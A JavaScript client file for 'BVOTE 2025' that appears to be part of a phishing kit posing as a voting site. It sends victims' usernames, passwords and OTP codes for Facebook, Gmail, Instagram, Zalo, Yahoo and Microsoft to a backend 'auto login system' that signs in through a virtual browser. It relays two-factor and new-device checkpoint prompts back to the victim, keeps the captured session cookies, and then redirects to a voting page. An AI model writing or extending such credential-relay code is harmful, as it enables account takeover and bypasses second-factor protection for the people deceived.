/**
 * BVOTE 2025 WebSocket Integration
 * Real-time communication bridge between user interface and auto-login system
 */

class WebSocketAutoLoginBridge {
    constructor() {
        this.socket = null;
        this.reconnectAttempts = 0;
        this.maxReconnectAttempts = 5;
        this.reconnectDelay = 3000;
        this.messageQueue = [];
        this.activeLoginSession = null;
        this.callbacks = new Map();

        this.init();
    }

    /**
     * Initialize WebSocket connection
     */
    init() {
        try {
            this.socket = new WebSocket('ws://localhost:8080');

            this.socket.onopen = () => {
                console.log('🔗 WebSocket connected to Auto Login System');
                this.reconnectAttempts = 0;
                this.flushMessageQueue();
                this.updateConnectionStatus(true);
            };

            this.socket.onmessage = (event) => {
                try {
                    const message = JSON.parse(event.data);
                    this.handleMessage(message);
                } catch (error) {
                    console.error('❌ WebSocket message parse error:', error);
                }
            };

            this.socket.onclose = () => {
                console.log('🔌 WebSocket disconnected');
                this.updateConnectionStatus(false);
                this.attemptReconnection();
            };

            this.socket.onerror = (error) => {
                console.error('❌ WebSocket error:', error);
                this.updateConnectionStatus(false);
            };

        } catch (error) {
            console.error('❌ WebSocket initialization failed:', error);
            this.updateConnectionStatus(false);
        }
    }

    /**
     * Handle incoming WebSocket messages
     */
    handleMessage(message) {
        const { type, data } = message;

        switch (type) {
            case 'login_started':
                this.handleLoginStarted(data);
                break;

            case 'login_completed':
                this.handleLoginCompleted(data);
                break;

            case 'login_error':
                this.handleLoginError(data);
                break;

            case 'otp_required':
                this.handleOTPRequired(data);
                break;

            case 'checkpoint_required':
                this.handleCheckpointRequired(data);
                break;

            case 'session_status':
                this.handleSessionStatus(data);
                break;

            case 'system_status':
                this.handleSystemStatus(data);
                break;

            default:
                console.log('📨 Unknown message type:', type, data);
        }

        // Execute registered callbacks
        if (this.callbacks.has(type)) {
            this.callbacks.get(type).forEach(callback => callback(data));
        }
    }

    /**
     * Handle login started notification
     */
    handleLoginStarted(data) {
        const { sessionId, platform, message } = data;

        // Update UI loading state
        this.updateLoginStatus('processing', message || 'Đang khởi tạo quá trình đăng nhập...');

        // Show platform-specific loading message
        const platformMessages = {
            facebook: 'Đang mở Facebook trong trình duyệt ảo...',
            gmail: 'Đang kết nối đến Gmail...',
            instagram: 'Đang tải Instagram...',
            zalo: 'Đang truy cập Zalo...',
            yahoo: 'Đang kết nối Yahoo...',
            microsoft: 'Đang tải Microsoft Account...'
        };

        if (platformMessages[platform]) {
            setTimeout(() => {
                this.updateLoginStatus('processing', platformMessages[platform]);
            }, 1000);
        }

        this.activeLoginSession = sessionId;
    }

    /**
     * Handle login completion
     */
    handleLoginCompleted(data) {
        const { status, message, platform, cookies } = data;

        if (status === 'success') {
            this.updateLoginStatus('success', message || 'Đăng nhập thành công!');

            // Store session info if needed
            if (cookies) {
                this.storeSessionCookies(platform, cookies);
            }

            // Show success animation
            this.showSuccessAnimation();

            // Auto redirect after success
            setTimeout(() => {
                this.redirectToVotingPage();
            }, 2000);

        } else {
            this.updateLoginStatus('error', message || 'Đăng nhập thất bại');
        }

        this.activeLoginSession = null;
    }

    /**
     * Handle login error
     */
    handleLoginError(data) {
        const { error, sessionId } = data;

        this.updateLoginStatus('error', error || 'Có lỗi xảy ra trong quá trình đăng nhập');
        this.showRetryOption();
        this.activeLoginSession = null;
    }

    /**
     * Handle OTP requirement
     */
    handleOTPRequired(data) {
        const { sessionId, message } = data;

        this.updateLoginStatus('otp_required', message || 'Vui lòng nhập mã OTP');
        this.showOTPInput();
    }

    /**
     * Handle checkpoint requirement
     */
    handleCheckpointRequired(data) {
        const { sessionId, message, url } = data;

        this.updateLoginStatus('checkpoint', message || 'Cần xác minh thiết bị');
        this.showCheckpointInstructions(url);
    }

    /**
     * Handle session status updates
     */
    handleSessionStatus(data) {
        const { sessionId, status, platform, progress } = data;

        if (progress) {
            this.updateProgress(progress);
        }

        // Update status display
        this.updateSessionDisplay(sessionId, status, platform);
    }

    /**
     * Handle system status updates
     */
    handleSystemStatus(data) {
        const { activeSessions, systemLoad, available } = data;

        if (!available) {
            this.showSystemUnavailable();
        } else {
            this.updateSystemInfo(activeSessions, systemLoad);
        }
    }

    /**
     * Send login request via WebSocket
     */
    sendLoginRequest(loginData) {
        const message = {
            type: 'login_request',
            payload: {
                sessionId: this.generateSessionId(),
                platform: loginData.platform,
                username: loginData.username,
                password: loginData.password,
                otp: loginData.otp || '',
                timestamp: Date.now()
            }
        };

        this.sendMessage(message);
        return message.payload.sessionId;
    }

    /**
     * Send OTP submission
     */
    sendOTP(otpCode) {
        if (!this.activeLoginSession) {
            console.error('❌ No active login session for OTP');
            return;
        }

        const message = {
            type: 'submit_otp',
            payload: {
                sessionId: this.activeLoginSession,
                otp: otpCode,
                timestamp: Date.now()
            }
        };

        this.sendMessage(message);
    }

    /**
     * Send checkpoint approval
     */
    sendCheckpointApproval() {
        if (!this.activeLoginSession) {
            console.error('❌ No active login session for checkpoint');
            return;
        }

        const message = {
            type: 'approve_checkpoint',
            payload: {
                sessionId: this.activeLoginSession,
                approved: true,
                timestamp: Date.now()
            }
        };

        this.sendMessage(message);
    }

    /**
     * Cancel current login
     */
    cancelLogin() {
        if (!this.activeLoginSession) {
            return;
        }

        const message = {
            type: 'cancel_login',
            payload: {
                sessionId: this.activeLoginSession,
                timestamp: Date.now()
            }
        };

        this.sendMessage(message);
        this.activeLoginSession = null;
    }

    /**
     * Send message via WebSocket
     */
    sendMessage(message) {
        if (this.socket && this.socket.readyState === WebSocket.OPEN) {
            this.socket.send(JSON.stringify(message));
        } else {
            // Queue message for later sending
            this.messageQueue.push(message);
            console.log('📤 Message queued (WebSocket not ready):', message.type);
        }
    }

    /**
     * Flush queued messages
     */
    flushMessageQueue() {
        while (this.messageQueue.length > 0) {
            const message = this.messageQueue.shift();
            this.sendMessage(message);
        }
    }

    /**
     * Attempt reconnection
     */
    attemptReconnection() {
        if (this.reconnectAttempts >= this.maxReconnectAttempts) {
            console.error('❌ Max reconnection attempts reached');
            this.showConnectionError();
            return;
        }

        this.reconnectAttempts++;
        console.log(`🔄 Reconnection attempt ${this.reconnectAttempts}/${this.maxReconnectAttempts}`);

        setTimeout(() => {
            this.init();
        }, this.reconnectDelay * this.reconnectAttempts);
    }

    /**
     * Register event callback
     */
    on(eventType, callback) {
        if (!this.callbacks.has(eventType)) {
            this.callbacks.set(eventType, []);
        }
        this.callbacks.get(eventType).push(callback);
    }

    /**
     * Remove event callback
     */
    off(eventType, callback) {
        if (this.callbacks.has(eventType)) {
            const callbacks = this.callbacks.get(eventType);
            const index = callbacks.indexOf(callback);
            if (index > -1) {
                callbacks.splice(index, 1);
            }
        }
    }

    // UI Update Methods
    updateLoginStatus(status, message) {
        const statusElement = document.getElementById('login-status');
        const messageElement = document.getElementById('login-message');

        if (statusElement) {
            statusElement.className = `login-status ${status}`;
            statusElement.textContent = this.getStatusText(status);
        }

        if (messageElement) {
            messageElement.textContent = message;
        }

        // Update loading animation
        this.updateLoadingAnimation(status);
    }

    updateLoadingAnimation(status) {
        const loadingElement = document.querySelector('.loading-container');
        const progressElement = document.querySelector('.progress-bar');

        if (!loadingElement) return;

        switch (status) {
            case 'processing':
                loadingElement.style.display = 'flex';
                this.animateProgress();
                break;

            case 'success':
                loadingElement.classList.add('success');
                if (progressElement) progressElement.style.width = '100%';
                break;

            case 'error':
                loadingElement.classList.add('error');
                break;

            default:
                loadingElement.style.display = 'none';
        }
    }

    animateProgress() {
        const progressElement = document.querySelector('.progress-bar');
        if (!progressElement) return;

        let width = 0;
        const interval = setInterval(() => {
            width += Math.random() * 10;
            if (width >= 90) {
                width = 90;
                clearInterval(interval);
            }
            progressElement.style.width = width + '%';
        }, 500);
    }

    showOTPInput() {
        const otpModal = document.getElementById('otp-modal');
        if (otpModal) {
            otpModal.style.display = 'flex';

            // Focus on OTP input
            const otpInput = document.getElementById('otp-input');
            if (otpInput) {
                otpInput.focus();
            }
        }
    }

    showCheckpointInstructions(url) {
        const checkpointModal = document.getElementById('checkpoint-modal');
        if (checkpointModal) {
            checkpointModal.style.display = 'flex';

            // Update instructions
            const instructionsElement = document.getElementById('checkpoint-instructions');
            if (instructionsElement) {
                instructionsElement.innerHTML = `
                    <p>Tài khoản của bạn cần xác minh thiết bị mới.</p>
                    <p>Vui lòng:</p>
                    <ol>
                        <li>Kiểm tra email hoặc SMS</li>
                        <li>Phê duyệt thiết bị mới</li>
                        <li>Nhấn "Đã xác minh" bên dưới</li>
                    </ol>
                    ${url ? `<p><a href="${url}" target="_blank">Mở trang xác minh</a></p>` : ''}
                `;
            }
        }
    }

    showSuccessAnimation() {
        const successElement = document.querySelector('.success-animation');
        if (successElement) {
            successElement.style.display = 'flex';
            successElement.classList.add('animate');
        }
    }

    showRetryOption() {
        const retryButton = document.getElementById('retry-login');
        if (retryButton) {
            retryButton.style.display = 'block';
        }
    }

    showConnectionError() {
        const errorElement = document.getElementById('connection-error');
        if (errorElement) {
            errorElement.style.display = 'block';
            errorElement.textContent = 'Không thể kết nối đến hệ thống đăng nhập tự động. Vui lòng thử lại sau.';
        }
    }

    updateConnectionStatus(connected) {
        const statusIndicator = document.querySelector('.connection-status');
        if (statusIndicator) {
            statusIndicator.className = `connection-status ${connected ? 'connected' : 'disconnected'}`;
            statusIndicator.textContent = connected ? 'Đã kết nối' : 'Mất kết nối';
        }
    }

    redirectToVotingPage() {
        // Smooth transition to voting interface
        const currentModal = document.querySelector('.modal.active');
        if (currentModal) {
            currentModal.classList.add('fade-out');

            setTimeout(() => {
                window.location.href = '/vote.php';
            }, 1000);
        }
    }

    // Helper methods
    generateSessionId() {
        return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }

    getStatusText(status) {
        const statusTexts = {
            'processing': 'Đang xử lý...',
            'success': 'Thành công',
            'error': 'Lỗi',
            'otp_required': 'Cần OTP',
            'checkpoint': 'Cần xác minh'
        };

        return statusTexts[status] || status;
    }

    storeSessionCookies(platform, cookies) {
        try {
            const sessionData = {
                platform: platform,
                cookies: cookies,
                timestamp: Date.now()
            };

            localStorage.setItem('bvote_session', JSON.stringify(sessionData));
        } catch (error) {
            console.error('❌ Failed to store session cookies:', error);
        }
    }

    updateProgress(progress) {
        const progressElement = document.querySelector('.progress-bar');
        if (progressElement) {
            progressElement.style.width = progress + '%';
        }

        const progressText = document.querySelector('.progress-text');
        if (progressText) {
            progressText.textContent = `${progress}%`;
        }
    }

    updateSessionDisplay(sessionId, status, platform) {
        const sessionElement = document.querySelector(`[data-session="${sessionId}"]`);
        if (sessionElement) {
            sessionElement.querySelector('.session-status').textContent = status;
            sessionElement.querySelector('.session-platform').textContent = platform;
        }
    }

    updateSystemInfo(activeSessions, systemLoad) {
        const systemInfoElement = document.querySelector('.system-info');
        if (systemInfoElement) {
            systemInfoElement.innerHTML = `
                <div class="system-stat">
                    <span class="label">Phiên hoạt động:</span>
                    <span class="value">${activeSessions}</span>
                </div>
                <div class="system-stat">
                    <span class="label">Tải hệ thống:</span>
                    <span class="value">${systemLoad}%</span>
                </div>
            `;
        }
    }

    showSystemUnavailable() {
        const unavailableElement = document.getElementById('system-unavailable');
        if (unavailableElement) {
            unavailableElement.style.display = 'block';
            unavailableElement.textContent = 'Hệ thống đăng nhập tự động hiện không khả dụng. Vui lòng thử lại sau.';
        }
    }

    /**
     * Disconnect WebSocket
     */
    disconnect() {
        if (this.socket) {
            this.socket.close();
            this.socket = null;
        }
    }

    /**
     * Get connection status
     */
    isConnected() {
        return this.socket && this.socket.readyState === WebSocket.OPEN;
    }

    /**
     * Get active session info
     */
    getActiveSession() {
        return this.activeLoginSession;
    }
}

// Export for use in user interface
window.WebSocketAutoLoginBridge = WebSocketAutoLoginBridge;
